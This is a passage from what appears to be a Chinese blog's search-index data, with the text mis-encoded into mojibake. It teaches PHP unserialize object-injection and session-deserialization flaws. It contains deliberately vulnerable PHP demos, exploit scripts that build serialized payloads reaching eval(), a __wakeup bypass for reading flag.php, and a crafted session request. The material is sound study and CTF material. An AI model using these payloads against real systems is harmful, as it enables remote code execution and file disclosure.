1O:13:&quot;SerializeDemo&quot;:3:{s:1:&quot;a&quot;;s:6:&quot;public&quot;;s:16:&quot;%00Serialize%00Demob&quot;;s:7:&quot;private&quot;;s:4:&quot;%00*%00c&quot;;s:9:&quot;protected&quot;;} ç»“æœè¾“å‡º ååºåˆ—åŒ–æ¼æ´æ¦‚å¿µPHP ååºåˆ—åŒ–æ¼æ´åˆå«åš PHP å¯¹è±¡æ³¨å…¥æ¼æ´ã€‚ ååºåˆ—åŒ–æ¼æ´çš„æˆå› åœ¨äºä»£ç ä¸­çš„ unserialize() æ¥æ”¶çš„å‚æ•°å¯æ§ï¼Œä»ä¸Šé¢çš„ä¾‹å­çœ‹ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œåºåˆ—åŒ–çš„å¯¹è±¡åªå«æœ‰å¯¹è±¡çš„å±æ€§ï¼Œé‚£æˆ‘ä»¬å°±è¦åˆ©ç”¨å¯¹å¯¹è±¡å±æ€§çš„ç¯¡æ”¹å®ç°æœ€ç»ˆçš„æ”»å‡»ã€‚ é­”æ³•å‡½æ•°å¸¸è§çš„é­”æ³•å‡½æ•° __construct() å½“å¯¹è±¡åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„)ã€‚ __destruct() å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ __toString() å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºåœ¨æ¨¡æ¿ä¸­çš„æ—¶å€™ï¼ˆè½¬æ¢æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼‰è‡ªåŠ¨è°ƒç”¨ã€‚ (1)echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘ (2)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ (3)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ (4)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ (5)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ (6)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶ (7)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨ (8)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™ __wakeup() å½“ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ __sleep() å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚ __invoke() å½“ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡è¢«å½“æˆä¸€ä¸ªæ–¹æ³•è°ƒç”¨æ—¶ä¼šè‡ªåŠ¨è§¦å‘æ­¤æ–¹æ³•ã€‚ __call() åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œå½“ä¸€ä¸ªè°ƒç”¨çš„æ–¹æ³•ä¸èƒ½è®¿é—®æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘ã€‚ 2.2.8 __get() å½“è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ åˆ©ç”¨é­”æ³•å‡½æ•°çš„æ”»å‡»å®ä¾‹(magic_function)æ¡ˆä¾‹ä»£ç  1234567891011121314151617181920212223242526272829&lt;?php class Greetdawn { private $test; public $Greetdawn = &quot;i am Greetdawn&quot;; function __construct() { $this-&gt;test = new L(); } function __destruct() { $this-&gt;test-&gt;action(); } } class L { function action() { echo &quot;Welcome to Sec World&quot;; } } class Evil { var $test2; function action() { eval($this-&gt;test2); } } if(isset($_GET['test'])){ unserialize($_GET['test']); } else { $obj = new Greetdawn(); highlight_file(__FILE__); }?&gt; ä»£ç åˆ†æ é¦–å…ˆå‘ç°æœ‰ä¸‰ä¸ªç±»ï¼Œä¸»ç±»ä¸ºGreetdawnï¼Œä¸”è¯¥ç±»ä¸­æœ‰__construct()ã€__destruct()ä¸¤ä¸ªé­”æ³•å‡½æ•°ï¼› å®ä¾‹åŒ–Greetdawnç±»çš„æ—¶å€™ï¼Œä¼šå…ˆè§¦å‘__construct()æ–¹æ³•ï¼Œå®ä¾‹åŒ–ä¸€ä¸ªLç±»å¹¶èµ‹å€¼ç»™å˜é‡testï¼› Lç±»ä¸­å«æœ‰actionæ–¹æ³•ä¸”è¾“å‡ºä¸€å¥è¯ï¼› æˆ‘ä»¬å‘ç°åœ¨Lç±»ä¸‹æ–¹è¿˜å­˜åœ¨ä¸€ä¸ªEvilçš„ç±»ä¹ŸåŒæ ·å­˜åœ¨ä¸€ä¸ªactionæ–¹æ³•ï¼Œä½†æ˜¯è¯¥æ–¹æ³•ä¸­æ˜¯è°ƒç”¨ä¸€ä¸ªevalçš„å±é™©å‡½æ•°ï¼› é‚£è¿™è¾¹å¼ºåˆ¶å°†__construct()æ–¹æ³•ä¸­å®ä¾‹åŒ–çš„ç±»æ”¹ä¸ºEvilç±»å³å¯è¾¾æˆåˆ©ç”¨ï¼› exp 1234567891011121314&lt;?php class Greetdawn { private $test; function __construct() { $this-&gt;test = new Evil(); } } class Evil { var $test2 = &quot;phpinfo();&quot;; } $data = new Greetdawn(); echo urlencode(serialize($data));?&gt;O%3A9%3A%22Greetdawn%22%3A1%3A%7Bs%3A15%3A%22%00Greetdawn%00test%22%3BO%3A4%3A%22Evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D ååºåˆ—åŒ–æ”»å‡»æµç¨‹(1)å¯»æ‰¾unserialize()å‡½æ•°çš„å‚æ•°æ˜¯å¦æœ‰æˆ‘ä»¬çš„å¯æ§ç‚¹(2)å¯»æ‰¾æˆ‘ä»¬çš„ååºåˆ—åŒ–çš„ç›®æ ‡ï¼Œé‡ç‚¹å¯»æ‰¾ å­˜åœ¨ wakeup() æˆ– destruct() é­”æ³•å‡½æ•°çš„ç±»(3)ä¸€å±‚ä¸€å±‚åœ°ç ”ç©¶è¯¥ç±»åœ¨é­”æ³•æ–¹æ³•ä¸­ä½¿ç”¨çš„å±æ€§å’Œå±æ€§è°ƒç”¨çš„æ–¹æ³•ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å¯æ§çš„å±æ€§èƒ½å®ç°åœ¨å½“å‰è°ƒç”¨çš„è¿‡ç¨‹ä¸­è§¦å‘çš„(4)æ‰¾åˆ°æˆ‘ä»¬è¦æ§åˆ¶çš„å±æ€§äº†ä»¥åæˆ‘ä»¬å°±å°†è¦ç”¨åˆ°çš„ä»£ç éƒ¨åˆ†å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åæ„é€ åºåˆ—åŒ–ï¼Œå‘èµ·æ”»å‡» __wakeupå‡½æ•°ç»•è¿‡æ¼æ´æºç 1234567891011121314151617181920212223242526&lt;?phpclass SoFun{ protected $file='index.php'; function __destruct(){ if(!empty($this-&gt;file)) { if(strchr($this-&gt; file,&quot;\\\\&quot;)===false &amp;&amp; strchr($this-&gt;file, '/')===false) show_source(dirname (__FILE__).'/'.$this -&gt;file); else die('Wrong filename.'); } } function __wakeup(){ $this-&gt; file='index.php'; } public function __toString(){ return '' ; }}if (!isset($_GET['file'])){ show_source('index.php');}else{ $file=base64_decode($_GET['file']); echo unserialize($file);}?&gt; #&lt;!--key in flag.php--&gt; å®¡è®¡æ€è·¯ æºç æœ€åæç¤ºï¼ŒKEYåœ¨flag.phpé‡Œé¢ï¼› æ³¨æ„åˆ°__destructé­”æœ¯æ–¹æ³•ä¸­ï¼Œæœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼Œå°†fileæ–‡ä»¶å†…å®¹æ˜¾ç¤ºå‡ºæ¥ show_source(dirname(FILE).â€™/â€˜.$this-&gt;file)ï¼Œè¿™ä¸ªæ˜¯è§£é¢˜å…³é”®ï¼› è‹¥POSTâ€œfileâ€å‚æ•°ä¸ºåºåˆ—åŒ–å¯¹è±¡ï¼Œä¸”å°†fileè®¾ä¸ºflag.phpï¼›é‚£ä¹ˆå¯ä»¥é€šè¿‡unserializeååºåˆ—åŒ–ï¼Œè¿›è€Œè°ƒç”¨destructé­”æœ¯æ–¹æ³•æ¥æ˜¾ç¤ºflag.phpæºç ï¼ˆè¦æ³¨æ„çš„æ˜¯fileå‚æ•°å†…å®¹éœ€è¦ç»è¿‡base64ç¼–ç ï¼‰ï¼› ä½†æ˜¯é€šè¿‡unserializeååºåˆ—åŒ–ä¹‹åï¼Œä¹Ÿä¼šè°ƒç”¨__wakeupæ–¹æ³•ï¼Œå®ƒä¼šæŠŠfileè®¾ä¸ºindex.php; æ€»ç»“ä¸‹æ¥å°±æ˜¯ï¼Œæƒ³åŠæ³•æŠŠfileè®¾ä¸ºflag.phpï¼Œè°ƒç”¨__destructæ–¹æ³•ï¼Œä¸”ç»•è¿‡__wakeupã€‚ __wakeupç»•è¿‡ç‰¹æ€§ç»•è¿‡wakeupçš„é™åˆ¶ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œé‚£ä¹ˆå°±ä¼šè·³è¿‡wakeupæ–¹æ³•çš„æ‰§è¡Œã€‚ phpç‰ˆæœ¬é™åˆ¶ï¼šPHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10 fileæ˜¯protectedå±æ€§ï¼Œå› æ­¤éœ€è¦ç”¨\\00*\\00æ¥è¡¨ç¤ºï¼Œ\\00ä»£è¡¨asciiä¸º0çš„å€¼payload æ¼æ´åˆ©ç”¨å› phpç‰ˆæœ¬åŸå› æœªå¤ç°å¯ä»¥ç®€å•çš„ä½¿ç”¨phpstudyæ¥å¤ç°æ¯”è¾ƒå¿«æ·ï¼› 123456789&lt;?php class SoFun{ protected $file = 'flag.php'; } $object = new SoFun(); $data = serialize($object); echo $data; echo base64_encode($data);","link":"/2019/05/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/php-code-audit/php-unserialize-vul/"},{"title":"sessionååºåˆ—åŒ–","text":"sessionååºåˆ—åŒ–PHP sessionåŸºç¡€ä»€ä¹ˆæ˜¯session?Sessionä¸€èˆ¬ç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€œï¼Œç®€å•æ¥è¯´å°±æ˜¯æ˜¯ä¸€ç§å®¢æˆ·ä¸ç½‘ç«™/æœåŠ¡å™¨æ›´ä¸ºå®‰å…¨çš„å¯¹è¯æ–¹å¼ã€‚ä¸€æ—¦å¼€å¯äº† session ä¼šè¯ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™çš„ä»»ä½•é¡µé¢ä½¿ç”¨æˆ–ä¿æŒè¿™ä¸ªä¼šè¯ï¼Œä»è€Œè®©è®¿é—®è€…ä¸ç½‘ç«™ä¹‹é—´å»ºç«‹äº†ä¸€ç§â€œå¯¹è¯â€æœºåˆ¶ã€‚ PHP sessionå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å˜é‡ï¼Œä¸”è¯¥å˜é‡æ˜¯ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯çš„è®¾ç½®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒPHP Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ï¼Œä¸”å…¶å¯¹åº”çš„å…·ä½“ session å€¼ä¼šå­˜å‚¨äºæœåŠ¡å™¨ç«¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ cookieçš„ä¸»è¦åŒºåˆ«ï¼Œæ‰€ä»¥seesion çš„å®‰å…¨æ€§ç›¸å¯¹è¾ƒé«˜ã€‚ php sessionçš„å·¥ä½œæµç¨‹(1) å¼€å§‹ä¼šè¯æ—¶ï¼Œphpä¼šå°è¯•ä»è¯·æ±‚ä¸­æŸ¥æ‰¾ä¼šè¯idã€‚è‹¥å‘ç°è¯·æ±‚ä¿¡æ¯ä¸­ä¸å­˜åœ¨session idï¼Œphpå°±ä¼šè‡ªåŠ¨è°ƒç”¨php_session_create_idå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œå¹¶ä¸”åœ¨å“åº”å¤´ä¸­ä½¿ç”¨set-cookieå¤´éƒ¨å‘é€ç»™å®¢æˆ·ç«¯ä¿å­˜; (2) phpä¼šå°†ä¼šè¯ä¸­çš„æ•°æ®è®¾ç½®åˆ°$_SESSIONå˜é‡ä¸­ï¼› (3) å½“ä¼šè¯åœæ­¢æ—¶ï¼Œä¼šè‡ªåŠ¨è¯»å–$_SESSIONä¸­çš„å†…å®¹ï¼Œå¹¶å°†å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå‘é€åˆ°ä¿å­˜ç®¡ç†å™¨è¿›è¡Œä¿å­˜ã€‚ å…·ä½“å·¥ä½œæµç¨‹å›¾å¦‚ä¸‹ï¼š sessionåœ¨php.iniä¸­çš„é…ç½® session.gc_divisor php sessionåƒåœ¾å›æ”¶æœºåˆ¶ç›¸å…³é…ç½® session.sid_bits_per_character æŒ‡å®šç¼–ç çš„ä¼šè¯IDå­—ç¬¦ä¸­çš„ä½æ•° session.save_path=â€â€ è¯¥é…ç½®ä¸»è¦è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„ session.save_handler=â€â€ è¯¥é…ç½®ä¸»è¦è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®sessionå­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•° session.use_strict_mode ä¸¥æ ¼ä¼šè¯æ¨¡å¼ï¼Œä¸¥æ ¼ä¼šè¯æ¨¡å¼ä¸æ¥å—æœªåˆå§‹åŒ–çš„ä¼šè¯IDå¹¶é‡æ–°ç”Ÿæˆä¼šè¯ID session.use_cookies æŒ‡å®šæ˜¯å¦åœ¨å®¢æˆ·ç«¯ç”¨ cookie æ¥å­˜æ”¾ä¼šè¯ IDï¼Œé»˜è®¤å¯ç”¨ session.cookie_secure æŒ‡å®šæ˜¯å¦ä»…é€šè¿‡å®‰å…¨è¿æ¥å‘é€ cookieï¼Œé»˜è®¤å…³é—­ session.use_only_cookies æŒ‡å®šæ˜¯å¦åœ¨å®¢æˆ·ç«¯ä»…ä»…ä½¿ç”¨cookieæ¥å­˜æ”¾ä¼šè¯ IDï¼Œå¯ç”¨çš„è¯ï¼Œå¯ä»¥é˜²æ­¢æœ‰å…³é€šè¿‡ URL ä¼ é€’ä¼šè¯ ID çš„æ”»å‡» session.name æŒ‡å®šä¼šè¯åä»¥ç”¨åš cookie çš„åå­—ï¼Œåªèƒ½ç”±å­—æ¯æ•°å­—ç»„æˆï¼Œé»˜è®¤ä¸º PHPSESSID session.auto_start æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤å€¼ä¸º 0ï¼Œä¸å¯åŠ¨ session.cookie_lifetime æŒ‡å®šäº†å‘é€åˆ°æµè§ˆå™¨çš„ cookie çš„ç”Ÿå‘½å‘¨æœŸï¼Œå•ä½ä¸ºç§’ï¼Œå€¼ä¸º 0 è¡¨ç¤ºâ€œç›´åˆ°å…³é—­æµè§ˆå™¨â€ã€‚é»˜è®¤ä¸º 0 session.cookie_path æŒ‡å®šè¦è®¾ç½®ä¼šè¯cookie çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º / session.cookie_domain æŒ‡å®šè¦è®¾ç½®ä¼šè¯cookie çš„åŸŸåï¼Œé»˜è®¤ä¸ºæ— ï¼Œè¡¨ç¤ºæ ¹æ® cookie è§„èŒƒäº§ç”Ÿcookieçš„ä¸»æœºå session.cookie_httponly å°†Cookieæ ‡è®°ä¸ºåªèƒ½é€šè¿‡HTTPåè®®è®¿é—®ï¼Œå³æ— æ³•é€šè¿‡è„šæœ¬è¯­è¨€ï¼ˆä¾‹å¦‚JavaScriptï¼‰è®¿é—®Cookieï¼Œæ­¤è®¾ç½®å¯ä»¥æœ‰æ•ˆåœ°å¸®åŠ©é€šè¿‡XSSæ”»å‡»å‡å°‘èº«ä»½ç›—ç”¨ session.serialize_handler å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨phpï¼Œè¿˜æœ‰å…¶ä»–å¼•æ“ï¼Œä¸”ä¸åŒå¼•æ“çš„å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒï¼Œå…·ä½“å¯è§ä¸‹æ–‡æ‰€è¿° session.gc_probability è¯¥é…ç½®é¡¹ä¸ session.gc_divisor åˆèµ·æ¥ç”¨æ¥ç®¡ç† garbage collectionï¼Œå³åƒåœ¾å›æ”¶è¿›ç¨‹å¯åŠ¨çš„æ¦‚ç‡ session.gc_divisor è¯¥é…ç½®é¡¹ä¸session.gc_probabilityåˆèµ·æ¥å®šä¹‰äº†åœ¨æ¯ä¸ªä¼šè¯åˆå§‹åŒ–æ—¶å¯åŠ¨åƒåœ¾å›æ”¶è¿›ç¨‹çš„æ¦‚ç‡ session.gc_maxlifetime æŒ‡å®šè¿‡äº†å¤šå°‘ç§’ä¹‹åæ•°æ®å°±ä¼šè¢«è§†ä¸ºâ€œåƒåœ¾â€å¹¶è¢«æ¸…é™¤ï¼Œåƒåœ¾æœé›†å¯èƒ½ä¼šåœ¨sessionå¯åŠ¨çš„æ—¶å€™å¼€å§‹ï¼ˆ å–å†³äºsession.gc_probability å’Œ session.gc_divisorï¼‰ session.referer_check åŒ…å«æœ‰ç”¨æ¥æ£€æŸ¥æ¯ä¸ª HTTP Refererçš„å­ä¸²ã€‚å¦‚æœå®¢æˆ·ç«¯å‘é€äº†Refererä¿¡æ¯ä½†æ˜¯åœ¨å…¶ä¸­å¹¶æœªæ‰¾åˆ°è¯¥å­ä¸²ï¼Œåˆ™åµŒå…¥çš„ä¼šè¯ ID ä¼šè¢«æ ‡è®°ä¸ºæ— æ•ˆã€‚é»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸² session.cache_limiter æŒ‡å®šä¼šè¯é¡µé¢æ‰€ä½¿ç”¨çš„ç¼“å†²æ§åˆ¶æ–¹æ³•ï¼ˆnone/nocache/private/private_no_expire/publicï¼‰ã€‚é»˜è®¤ä¸º nocache session.cache_expire ä»¥åˆ†é’Ÿæ•°æŒ‡å®šç¼“å†²çš„ä¼šè¯é¡µé¢çš„å­˜æ´»æœŸï¼Œæ­¤è®¾å®šå¯¹nocacheç¼“å†²æ§åˆ¶æ–¹æ³•æ— æ•ˆã€‚é»˜è®¤ä¸º 180 session.use_trans_sid æŒ‡å®šæ˜¯å¦å¯ç”¨é€æ˜ SID æ”¯æŒã€‚é»˜è®¤ç¦ç”¨ session.sid_length é…ç½®ä¼šè¯IDå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ ä¼šè¯IDçš„é•¿åº¦å¯ä»¥åœ¨22åˆ°256ä¹‹é—´ã€‚é»˜è®¤å€¼ä¸º32ã€‚ session.trans_sid_tags æŒ‡å®šå¯ç”¨é€æ˜sidæ”¯æŒæ—¶é‡å†™å“ªäº›HTMLæ ‡ç­¾ä»¥åŒ…æ‹¬ä¼šè¯ID session.trans_sid_hosts æŒ‡å®šå¯ç”¨é€æ˜sidæ”¯æŒæ—¶é‡å†™çš„ä¸»æœºï¼Œä»¥åŒ…æ‹¬ä¼šè¯ID session.sid_bits_per_character é…ç½®ç¼–ç çš„ä¼šè¯IDå­—ç¬¦ä¸­çš„ä½æ•° session.upload_progress.enabled å¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡ï¼Œ é»˜è®¤å¯ç”¨ã€‚ session.upload_progress.cleanup è¯»å–æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åï¼Œç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¯ç”¨ session.upload_progress.prefix é…ç½®$ _SESSIONä¸­ç”¨äºä¸Šä¼ è¿›åº¦é”®çš„å‰ç¼€ï¼Œé»˜è®¤ä¸ºupload_progress_ session.upload_progress.name $ _SESSIONä¸­ç”¨äºå­˜å‚¨è¿›åº¦ä¿¡æ¯çš„é”®çš„åç§°ï¼Œé»˜è®¤ä¸ºPHP_SESSION_UPLOAD_PROGRESS session.upload_progress.freq å®šä¹‰åº”è¯¥å¤šé•¿æ—¶é—´æ›´æ–°ä¸€æ¬¡ä¸Šä¼ è¿›åº¦ä¿¡æ¯ session.upload_progress.min_freq æ›´æ–°ä¹‹é—´çš„æœ€å°å»¶è¿Ÿ session.lazy_write é…ç½®ä¼šè¯æ•°æ®åœ¨æ›´æ”¹æ—¶æ˜¯å¦è¢«é‡å†™ï¼Œé»˜è®¤å¯ç”¨ sessionå­˜å‚¨æœºåˆ¶(1) ç”±session.serialize_handleræ¥å®šä¹‰å¼•æ“ï¼› (2) é»˜è®¤ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼› (3) æ–‡ä»¶å‘½åæ–¹å¼ä»¥sess_sessionid; (4) æ–‡ä»¶å†…å®¹æ˜¯ä¸€åºåˆ—åŒ–çš„æ–¹å¼è¿›è¡Œå­˜å‚¨ï¼› phpçš„ä¸‰ç§å¼•æ“session.serialize_handlerå®šä¹‰äº†ä¸‰ç§å¼•æ“ï¼š å¤„ç†å™¨åç§° å­˜å‚¨æ ¼å¼ php é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_serialize ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„ æ³¨ï¼šè‡ª PHP 5.5.4 èµ·å¯ä»¥ä½¿ç”¨php_serialize phpå¤„ç†å™¨ä»£ç å®ä¾‹ 12345678&lt;?php error_reporting(0); // php | php_binary | php_serialize ini_set('session.serialize_handler','php'); session_start(); $_SESSION['session'] = $_GET['session']; var_dump($_SESSION);?&gt; è¯·æ±‚åä¿å­˜çš„sessionæ–‡ä»¶å†…å®¹çš„ç»“æœä¸º: 12session|s:9:&quot;greetdawn&quot;;# æ ¼å¼ï¼šé”®å + | + åºåˆ—åŒ–åçš„å‚æ•°å€¼ php_binaryå¤„ç†å™¨ä»£ç å®ä¾‹ 12345678&lt;?php error_reporting(0); // php | php_binary | php_serialize ini_set('session.serialize_handler','php_binary'); session_start(); $_SESSION['passwdpasswdpasswdpasswdpasswdpassw'] = $_GET['session']; var_dump($_SESSION);?&gt; è¯·æ±‚åä¿å­˜çš„sessionæ–‡ä»¶å†…å®¹çš„ç»“æœä¸º: 12#passwdpasswdpasswdpasswdpasswdpassws:9:&quot;greetdawn&quot;;#ä¸ºé”®åé•¿åº¦å¯¹åº”çš„asciiå€¼ï¼Œpasswdpasswdpasswdpasswdpasswdpasswsä¸ºé”®åï¼Œåé¢ä¸ºgetå‚æ•°åºåˆ—åŒ–ä¹‹åçš„å€¼ php_serializeå¤„ç†å™¨ä»£ç å®ä¾‹ 12345678&lt;?php error_reporting(0); // php | php_binary | php_serialize ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['passwd'] = $_GET['session']; var_dump($_SESSION);?&gt; è¯·æ±‚åä¿å­˜çš„sessionæ–‡ä»¶å†…å®¹çš„ç»“æœä¸º: 12a:1:{s:6:&quot;passwd&quot;;s:9:&quot;greetdawn&quot;;}#æ ‡å‡†åŒ–çš„åºåˆ—åŒ–å­—ç¬¦ä¸²æ ¼å¼ php sessionååºåŒ–æ¼æ´æ¼æ´æ¦‚å¿µPHP sessionååºåˆ—åŒ–æ¼æ´ï¼Œç®€å•ç‚¹è¯´ï¼Œå°±æ˜¯å½“ç½‘ç«™åºåˆ—åŒ–å¹¶å­˜å‚¨Sessionä¸ååºåˆ—åŒ–å¹¶è¯»å–Sessionçš„æ–¹å¼ä¸åŒæ—¶å°±å¯èƒ½å¯¼è‡´sessionååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿã€‚ æ¼æ´demoï¼ˆsession_demoï¼‰index.php 1234567891011&lt;?php ini_set('session.serialize_handler', 'php_serialize'); session_start(); if (isset($_GET[&quot;name&quot;])) { $_SESSION[&quot;name&quot;] = $_GET[&quot;name&quot;]; highlight_file('demo.php'); } else { echo &quot;Please tell me You name?&quot;; highlight_file(__FILE__); } ?&gt; demo.php 1234567891011121314&lt;?phpini_set('session.serialize_handler', 'php');session_start();class lemon { var $hi; function __construct(){ $this-&gt;hi = 'phpinfo();'; } function __destruct() { eval($this-&gt;hi); }} æ¼æ´åˆ†æ æˆ‘ä»¬å‘ç°index.phpé€šè¿‡php_serializeå¼•æ“å¤„ç†sessionæ•°æ®ï¼Œdemo.phpé€šè¿‡phpå¼•æ“å¤„ç†sessionæ•°æ®; é€šè¿‡å‰é¢çš„çŸ¥è¯†æˆ‘ä»¬çŸ¥é“php_serializeå¼•æ“ä»¥æ­£å¸¸çš„ååºåˆ—åŒ–æ ¼å¼å­˜å‚¨å’ŒåŠ è½½sessionæ•°æ®ï¼Œphpä»¥|çš„æ–¹å¼å­˜å‚¨å’ŒåŠ è½½sessionæ•°æ®çš„ï¼› åˆ†ædemoçš„æºç ï¼Œå¯¹lemonç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¾—åˆ°å…¶åºåˆ—åŒ–çš„å€¼ä¸º:O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;} è¯·æ±‚index.phpå¸¦å…¥åºåˆ—åŒ–çš„å€¼ï¼Œhttp://192.168.1.191:32769/?name=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;} æœ€ç»ˆsessæ–‡ä»¶çš„ä¿å­˜æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š a:1:{s:4:&quot;name&quot;;s:44:&quot;|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;}&quot;;} å½“æˆ‘ä»¬å†æ¬¡è¯·æ±‚demo.phpæ–‡ä»¶æ—¶ï¼Œæ­¤æ–‡ä»¶ä¼šè®®phpå¤„ç†å™¨çš„æ–¹å¼åŠ è½½sessionæ–‡ä»¶ï¼Œæ­¤æ—¶``a:1:{s:4:â€nameâ€;s:44:â€|O:5:â€ä¸º é”®å,a:1:{s:4:â€nameâ€;s:44:â€|O:5:â€`ä¸ºå€¼ é‚£ä¹ˆæœ€åçš„å€¼å°±ä¼šè¢«æ­£å¸¸çš„è¿›è¡Œååºåˆ—åŒ–ï¼Œè°ƒç”¨evalå‡½æ•°ï¼› ä¾‹é¢˜å®æˆ˜session_upload(1) é¢˜ç›®æºç  index.php 12345678&lt;?php ini_set('session.serialize_handler', 'php'); require(&quot;./class.php&quot;); session_start(); $obj = new foo1(); $obj-&gt;varr = &quot;phpinfo.php&quot;;?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phphighlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));//show_source(__FILE__);class foo1{ public $varr; function __construct(){ $this-&gt;varr = &quot;i.php&quot;; } function __destruct(){ if(file_exists($this-&gt;varr)){ echo &quot;&lt;br&gt;æ–‡ä»¶&quot;.$this-&gt;varr.&quot;å­˜åœ¨&lt;br&gt;&quot;; } echo &quot;&lt;br&gt;è¿™æ˜¯foo1çš„ææ„å‡½æ•°&lt;br&gt;&quot;; }}class foo2{ public $varr; public $obj; function 